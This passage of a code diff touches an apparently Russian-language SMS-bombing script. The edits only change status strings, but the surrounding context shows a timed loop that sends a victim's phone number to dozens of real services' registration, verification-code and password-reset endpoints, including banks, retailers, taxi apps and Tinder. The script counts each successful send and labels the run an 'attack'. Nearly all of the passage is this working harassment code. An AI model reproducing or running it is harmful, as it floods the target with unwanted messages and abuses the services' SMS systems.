             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -10549,17 +10549,17 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -10568,10 +10568,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -10579,10 +10579,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -10591,10 +10591,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -10604,10 +10604,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -10615,10 +10615,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -10629,7 +10629,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -10637,10 +10637,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -10649,10 +10649,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -10661,10 +10661,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -10674,10 +10674,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -10687,10 +10687,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -10698,10 +10698,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -10711,10 +10711,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -10722,10 +10722,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -10735,10 +10735,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -10750,10 +10750,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -10761,10 +10761,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -10772,10 +10772,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -10783,10 +10783,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -10794,10 +10794,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -10806,10 +10806,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -10818,14 +10818,14 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -10834,10 +10834,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -10847,10 +10847,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -10860,10 +10860,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -10872,10 +10872,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -10883,10 +10883,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -10894,10 +10894,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -10905,10 +10905,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -10917,10 +10917,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -10930,10 +10930,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -10942,10 +10942,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -10953,10 +10953,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -10966,10 +10966,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -10977,10 +10977,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -10988,21 +10988,21 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar отправлено|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -11010,55 +11010,55 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -11067,22 +11067,22 @@ if call == str(2):
             R = R + 1
             print('[+] PizzaHut отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -11094,7 +11094,7 @@ if call == str(2):
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -11102,11 +11102,11 @@ if call == str(2):
             R = R + 1
             print('[+] Smsint отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -11114,11 +11114,11 @@ if call == str(2):
             R = R + 1
             print('[+] oyorooms отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post(
@@ -11129,11 +11129,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -11142,22 +11142,22 @@ if call == str(2):
             R = R + 1
             print('[+] newnext отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -11166,22 +11166,22 @@ if call == str(2):
             R = R + 1
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -11190,11 +11190,11 @@ if call == str(2):
             R = R + 1
             print('[+] Sberbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -11206,44 +11206,44 @@ if call == str(2):
             R = R + 1
             print('[+] Psbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             R = R + 1
             print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.carsmile.com/",
@@ -11252,22 +11252,22 @@ if call == str(2):
             R = R + 1
             print('[+] carsmile отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -11275,11 +11275,11 @@ if call == str(2):
             R = R + 1
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
